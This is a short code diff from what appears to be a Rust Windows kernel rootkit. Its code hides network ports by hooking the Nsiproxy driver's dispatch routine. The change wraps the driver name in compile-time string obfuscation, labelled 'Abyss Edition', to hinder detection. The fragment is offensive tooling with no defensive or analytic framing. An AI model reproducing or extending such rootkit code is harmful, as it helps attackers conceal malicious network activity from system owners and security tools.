@@ -25,14 +25,17 @@ use common::{
     structs::TargetPort,
 };
 
+// Abyss Edition: String obfuscation
+use obfstr::obfstr;
+
 // The maximum number of ports that can be hidden
 const MAX_PORT: usize = 100;
 
 /// Control code for the NSI communication.
 const NIS_CONTROL_CODE: u32 = 1179675;
 
-/// Network driver name.
-const NSI_PROXY: &str = "\\Driver\\Nsiproxy";
+/// Network driver name (obfuscated at compile-time).
+const NSI_PROXY: &str = obfstr!("\\Driver\\Nsiproxy");
 
 /// Holds the original NSI dispatch function.
 static mut ORIGINAL_NSI_DISPATCH: AtomicPtr<()> = AtomicPtr::new(null_mut());
